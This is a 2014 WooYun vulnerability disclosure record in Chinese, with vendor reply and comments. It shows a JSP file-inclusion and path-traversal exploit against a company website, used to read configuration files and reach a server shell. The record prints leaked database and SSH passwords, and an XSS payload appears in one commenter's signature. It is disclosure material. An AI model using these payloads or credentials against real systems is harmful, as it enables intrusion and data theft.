{"id": 1315, "wybug_id": "wooyun-2014-070909", "wybug_title": "前沿同创科技官网文件包含导致获取服务器shell", "wybug_corp": "北京前沿同创科技有限公司", "wybug_author": "蓝冰", "wybug_date": "2014-08-04 11:22", "wybug_open_date": "2014-09-18 11:24", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取", "文件包含漏洞", "文件包含漏洞利用技巧", "安全管理不到位"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向公众公开  简要描述： 厂商,能不能求小礼物呢,菜鸟表示还没收到过礼物 不行就算了  -.-求走大厂商啊....数据库权限不多说了 详细说明：  拿到了数据库的权限可以任意操控数据库,可以登陆SSH服务器利用的是文件包含漏洞问题页面:http://www.vasee.com/event/view.jsp?day=2014-08-03&emid=ff80808146acac6f014770b306751ec2&id=ff80808146acac6f014770b305231eb8&sub=其中sub参数就是包含处传递sub=index?后页面报错\n\n所以可以猜测 处理代码是 '/event/view_sub/view_'+'sum参数'+'.jsp'提交sub=1后显示正常,经过证明/event/view_sub/目录下确实有view_1.jsp所以猜测是正确的然后就是构造包含了,在包含这里卡了很久发现跨不出 event目录 然后web服务器是tomcat 所以读不了conf下的配置文件.后来随手一试构造如下参数suu=/../../../WEB-INF/web.xml?这样后台接收后sub参数就成了 /event/view_sub/view_/../../../WEB-INF/web.xml?.jsp?伪截断,这种截断可以用在脚本文件还有.xml .txt .css .js .html 这类文件\n<context-param>\t\t<param-name>uploadPath</param-name>\t\t<param-value>/var/www/html/vasee_pics/</param-value>\t\t<!--<param-value>D:\\\\upload\\\\</param-value>-->\t</context-param>\t\t<context-param>\t\t<param-name>pdfPath</param-name>\t\t<param-value>/user/local/vasee_pdfs/</param-value>\t\t<!--<param-value>d:\\\\xx\\\\</param-value>-->\t</context-param>\t<context-param>\t\t<param-name>exlPath</param-name>\t\t<param-value>/user/local/vasee_exls/</param-value>\t\t<!--<param-value>D:\\\\upload\\\\</param-value>-->\t</context-param>\t\t<filter>\t\t<filter-name>SetCharacterEncoding</filter-name>\t\t<filter-class>\t\t\tcom.vasee.filters.SetCharacterEncodingFilter\t\t</filter-class>\t\t<init-param>\t\t\t<param-name>encoding</param-name>\t\t\t<param-value>UTF-8</param-value>\t\t</init-param>\t</filter>\t\t\t<!-- Filters for the display tag functionality -->\t<filter>\t\t<filter-name>ResponseOverrideFilter</filter-name>\t\t<filter-class>\t\t\torg.displaytag.filter.ResponseOverrideFilter\t\t</filter-class>\t</filter>\t<filter>\t\t<filter-name>hibernatesession</filter-name>\t\t<filter-class>\t\t\torg.springframework.orm.hibernate3.support.OpenSessionInViewFilter\t\t</filter-class>\t</filter>\t<filter-mapping>\t\t<filter-name>hibernatesession</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>SetCharacterEncoding</filter-name>\t\t<url-pattern>*.do</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>SetCharacterEncoding</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>ResponseOverrideFilter</filter-name>\t\t<url-pattern>*.do</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>ResponseOverrideFilter</filter-name>\t\t<url-pattern>*.jsp</url-pattern>\t</filter-mapping>\t<!--伪静态的过滤 -->\t<filter>\t\t<filter-name>UrlRewriteFilter</filter-name>\t\t<filter-class>\t\t\torg.tuckey.web.filters.urlrewrite.UrlRewriteFilter\t\t</filter-class>\t\t<init-param>\t\t\t<param-name>confPath</param-name>\t\t\t<param-value>/WEB-INF/urlrewrite.xml</param-value>\t\t</init-param>\t</filter>\t<filter-mapping>\t\t<filter-name>UrlRewriteFilter</filter-name>\t\t<url-pattern>/g/*</url-pattern>\t</filter-mapping>\t<servlet>\t\t<servlet-name>DrawImageServlet</servlet-name>\t\t<servlet-class>\t\t\tnet.sourceforge.jimagetaglib.servlet.DrawImageServlet\t\t</servlet-class>\t</servlet>\t<servlet-mapping>\t\t<servlet-name>DrawImageServlet</servlet-name>\t\t<url-pattern>/jit</url-pattern>\t</servlet-mapping>\t\t<!-- Action Servlet Configuration -->\t<servlet>\t\t<servlet-name>action</servlet-name>\t\t<servlet-class>\t\t\torg.apache.struts.action.ActionServlet\t\t</servlet-class>\t\t<init-param>\t\t\t<param-name>config</param-name>\t\t\t<param-value>/WEB-INF/struts-config.xml</param-value>\t\t</init-param>\t\t<init-param>\t\t\t<param-name>debug</param-name>\t\t\t<param-value>2</param-value>\t\t</init-param>\t\t<init-param>\t\t\t<param-name>validate</param-name>\t\t\t<param-value>true</param-value>\t\t</init-param>\t</servlet>\t<!-- Action Servlet Mapping -->\t<servlet-mapping>\t\t<servlet-name>action</servlet-name>\t\t<url-pattern>*.do</url-pattern>\t</servlet-mapping>\t<context-param>\t\t<param-name>contextConfigLocation</param-name>\t\t<param-value>/WEB-INF/applicationContext.xml</param-value>\t</context-param>\t<listener>\t\t<listener-class>\t\t\torg.springframework.web.context.ContextLoaderListener\t\t</listener-class>\t</listener>\n看第一行\n<context-param>\t\t<param-name>uploadPath</param-name>\t\t<param-value>/var/www/html/vasee_pics/</param-value>\t\t<!--<param-value>D:\\\\upload\\\\</param-value>-->\t</context-param>\n这个目录就是pics.vasee.com域名的目录 用来存放图片的看到这思路就来了,在官网所有上传处都有漏洞可以上传jsp文件,不过当访问jsp的时候会给你解析成图片这就蛋疼了,不过现在目录有了,这俩域名都是一个服务器IP,然后在用包含漏洞包含jsp就能得到一个shell了 不过上面我说过跨不出event目录,就是从这得出的,接下来又是一阵看web.xml的内容挨个试一遍找到这个文件\n<context-param>\t\t<param-name>contextConfigLocation</param-name>\t\t<param-value>/WEB-INF/applicationContext.xml</param-value>\t</context-param>\n包含过去读出它的内容然后我又幸运的再这个文件找到另一个敏感文件\n<bean id=\"propertyConfigurer\"\t\tclass=\"org.springframework.beans.factory.config.PropertyPlaceholderConfigurer\">\t\t<property name=\"locations\">\t\t\t<list>\t\t\t\t<value>/WEB-INF/config.properties</value>\t\t\t</list>\t\t</property>\t</bean>\nOK 继续读出这个文件内容,惊喜来了!猜内容是什么？ \nsubDomain.id=1006hibernate.connection.driver_class org.postgresql.Driverhibernate.connection.username=postgres#hibernate.connection.url=jdbc\\:postgresql\\://127.0.0.1/testhibernate.connection.url=jdbc\\:postgresql\\://127.0.0.1/vaseedbstable#hibernate.connection.url=jdbc\\:postgresql\\://103.31.201.95/test#hibernate.connection.password=123456hibernate.connection.password=e2010ee_yan#hibernate.connection.password=root#hibernate.connection.password=voasseeee#hibernate.connection.password=vpaossetegphoneapp.android.version=1.1phoneapp.iphone.version=1.1phoneapp.android.update_url=http://down.mumayi.com/94512phoneapp.iphone.update_url=https://itunes.apple.com/cn/app/vasee/id488543987?mt=8#font.src.path=c\\:/windows/fonts/font.src.path=/user/local/vasee_pdfs/source/\n数据库连接信息! 爽!不过悲剧又来了,没有开放数据库端口然后想到连它的SSH端口(记忆中在一个网页看到过postgresql的postgres用户存在于系统帐号)不知道是不是真的,-.-然后就连接成功了权限是数据库权限用户名就是postgres密码不是数据库密码hibernate.connection.password=e2010ee_yan而是这个密码#hibernate.connection.password=vpaosseteg可以查看web代码,无权限修改,能任意操作数据库最后来几张截图 0.0\n\n\n\n\n\n<jsp:include page=\"/event/view_sub/view_${sub}.jsp\" />这个就是包含处的代码,表示不懂JSP不明白为什么跨不了目录   漏洞证明：  \n\n\n\n\n\n   修复方案：  包含处进行过滤,SSH也设置一下连接IP,文件上传处也过滤一下,把密码改一下,虽然,目前没发现利用点不过以后的事很难说,最后请厂商相信我,我连看都没看数据库就是连接了一下然后截了图退出了.   版权声明：转载请注明来源 蓝冰@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-08-05 15:39 厂商回复： 此漏洞已修复，谢谢 蓝冰 提出的漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-04 11:23 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  @@! 服务器shell     \n     2014-08-04 11:40 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  经典啊    \n     2014-08-04 11:40 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  打雷了    \n     2014-08-04 11:46 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  确实经典啊    \n     2014-08-04 11:48 |    \t\t蓝冰 \t\t\t( 核心白帽子 |\t\t\t        Rank:627 漏洞数:50        | -.-)\t\t \n  小弟好激动啊，打雷是啥意思啊    \n     2014-08-04 11:52 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  打雷就是 精华案例    \n     2014-08-04 11:55 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  @蓝冰  加精    \n     2014-08-04 11:57 |    \t\t蓝冰 \t\t\t( 核心白帽子 |\t\t\t        Rank:627 漏洞数:50        | -.-)\t\t \n  嘿嘿，竟然加精了，    \n     2014-08-04 12:07 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  @蓝冰 就是打雷下礼物了    \n     2014-08-04 12:58 |    \t\tMirror \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:5        | ->_->)\t\t \n  膜拜    \n     2014-08-04 13:10 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  打雷了，拍这 拍这    \n     2014-08-04 13:31 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  好屌的样子。    \n     2014-08-04 13:31 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  新厂一来就是一大波白帽子正在靠近    \n     2014-08-04 13:38 |    \t\t小呆呆 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:7        | 每次有人骂我猪我都说我偶像也是猪)\t\t \n  打雷了，电死你！    \n     2014-08-04 13:51 |    \t\t蓝冰 \t\t\t( 核心白帽子 |\t\t\t        Rank:627 漏洞数:50        | -.-)\t\t \n  话说，有自动忽略的预感，    \n     2014-08-04 13:54 |    \t\t白非白 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:60        | ♫ Freedom - Anthony Hamilton ♫)\t\t \n  @felixk3y 确实经典？    \n     2014-08-04 14:27 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  似乎有好思路，先收藏了~    \n     2014-08-04 14:30 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:22        | 还需要等待.........)\t\t \n  似乎挺好看,mark!    \n     2014-08-04 15:50 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  打雷了~~~    \n     2014-08-04 18:33 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  @felixk3y 看到了？    \n     2014-08-05 23:13 |    \t\t蓝冰 \t\t\t( 核心白帽子 |\t\t\t        Rank:627 漏洞数:50        | -.-)\t\t \n  @北京前沿同创科技有限公司 厂商能不能把剩下的也确认啊 已忽略好难看的说...!-.-    \n     2014-09-05 20:51 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  先mark    \n     2014-09-18 13:25 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  不错    \n     2014-10-04 20:36 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  被雷劈了……楼主你可还好……    \n     2014-10-04 23:42 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  这样都能连接ssh， 那么连接ssh反弹个socks不知是否可行，这样的话就进内网了。    \n     2015-01-06 17:13 |    \t\tcovertops \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:23        | wooyun)\t\t \n  @蓝冰 想知道为什么跨不出目录，现在洞主有思路了不？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}